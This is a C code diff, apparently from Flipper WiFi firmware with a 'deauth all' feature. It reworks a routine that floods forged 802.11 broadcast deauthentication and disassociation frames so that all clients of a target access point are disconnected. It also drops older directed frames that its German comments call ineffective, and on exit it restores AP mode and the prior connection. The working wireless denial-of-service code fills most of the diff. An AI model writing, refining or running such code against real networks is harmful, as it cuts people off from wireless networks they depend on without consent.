@@ -366,8 +366,17 @@ static void send_broadcast_deauth(const uint8_t* bssid, uint8_t reason) {
 static void send_deauth_burst_for_ap(const uint8_t* bssid, uint8_t reason) {
     uint8_t buf[26];
 
-    // Arah 1: AP → Client
-    buf[0] = 0xC0; buf[1] = 0x00;
+    // Ehrliches Broadcast-Deauth pro BSSID: ohne bekannte Client-MACs ist der
+    // Broadcast (Ziel FF:FF:FF:FF:FF:FF, Quelle + BSSID = AP) der einzige Frame,
+    // der reale Stationen erreicht. Früher wurden zusätzlich "gerichtete" Frames
+    // mit der EIGENEN MAC als Client gesendet — die deauthen niemanden (der
+    // Flipper ist nicht assoziiert) und waren reine Deko; entfernt.
+
+    // Broadcast-Deauth (Subtype 0xC0) — immer gesendet.
+    send_broadcast_deauth(bssid, reason);
+
+    // Zusätzlich Broadcast-Disassoc (Subtype 0xA0) desselben BSSID.
+    buf[0] = 0xA0; buf[1] = 0x00;
     buf[2] = 0x3A; buf[3] = 0x01;
     memcpy(&buf[4],  global_broadcast_mac, 6);
     memcpy(&buf[10], bssid, 6);
@@ -375,28 +384,6 @@ static void send_deauth_burst_for_ap(const uint8_t* bssid, uint8_t reason) {
     write_seq_ctrl(buf, s_seq_counter++);
     buf[24] = reason; buf[25] = 0x00;
     send_frame_repeat(buf, sizeof(buf));
-
-    buf[0] = 0xA0;
-    write_seq_ctrl(buf, s_seq_counter++);
-    send_frame_repeat(buf, sizeof(buf));
-
-    // Broadcast (rate 20%)
-    send_broadcast_deauth(bssid, reason);
-
-    // Arah 2: Client → AP
-    uint8_t rev[26];
-    rev[0] = 0xC0; rev[1] = 0x00;
-    rev[2] = 0x3A; rev[3] = 0x01;
-    memcpy(&rev[4],  bssid, 6);
-    memcpy(&rev[10], s_flipper_hardware_mac, 6);
-    memcpy(&rev[16], bssid, 6);
-    write_seq_ctrl(rev, s_seq_counter++);
-    rev[24] = reason; rev[25] = 0x00;
-    send_frame_repeat(rev, sizeof(rev));
-
-    rev[0] = 0xA0;
-    write_seq_ctrl(rev, s_seq_counter++);
-    send_frame_repeat(rev, sizeof(rev));
 }
 
 // ============================================================================
@@ -935,5 +922,18 @@ void wlan_app_scene_deauth_all_on_exit(void* context) {
     if(s_marauder_ap_sync_pending) {
         deauth_copy_ap_records_to_app(app);
         s_marauder_ap_sync_pending = false;
+    }
+
+    // Reihenfolge: Worker ist oben gestoppt/gejoint → jetzt den raw-TX-SoftAP
+    // wieder abbauen (die TX-Helfer schalten beim ersten Deauth auf APSTA;
+    // bleibt er an, beaconnt ein verstecktes AP bis zum Reboot) und — falls vor
+    // dem Feature eine STA-Verbindung bestand — zum letzten Netz zurückverbinden
+    // (globales WiFi soll über App-Grenzen bestehen bleiben, vgl. scene_handshake).
+    wlan_hal_set_ap_mode(false);
+    if(app->connected) {
+        char pw[WLAN_APP_PASSWORD_MAX] = {0};
+        wlan_password_read(app->connected_ap.ssid, pw, sizeof(pw));
+        wlan_hal_connect(
+            app->connected_ap.ssid, pw, app->connected_ap.bssid, app->connected_ap.channel);
     }
 }
